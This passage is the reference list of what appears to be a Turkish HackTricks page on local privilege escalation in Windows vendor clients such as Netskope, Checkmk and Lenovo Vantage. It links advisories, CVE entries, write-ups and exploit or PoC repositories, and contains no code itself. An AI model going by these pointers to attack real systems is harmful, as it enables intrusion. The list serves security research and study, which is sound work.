- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin'i](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit'i](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre ve Razer Synapse 4 üzerinde Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent'taki yazılabilir dosyalar üzerinden Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent'ta privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC'leri](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Notepad++ Supply Chain'ini Exploit Ediyor](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure olay güncellemesi](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows'ta CVE-2025-0309 için uygulanan fix'in Bypass Edilmesi](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage'taki Privilege Escalation Bug'larının Ortaya Çıkarılması](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
